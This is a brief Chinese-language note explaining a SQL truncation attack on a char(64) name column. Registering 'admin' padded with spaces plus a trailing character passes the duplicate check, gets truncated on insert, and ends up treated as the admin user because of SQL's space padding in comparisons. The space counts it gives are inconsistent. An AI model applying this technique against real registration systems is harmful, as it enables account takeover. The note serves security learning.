基于约束的SQL攻击
name char(64),数据库中有一个admin用户
注册一个admin+64空格+1,在select * FROM users where name=’admin+64空格+1’中查询结果是空
但是在insert中会去掉后面多余的字符注册一个admin+59个空格的用户，这个用户等同于admin用户
这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致
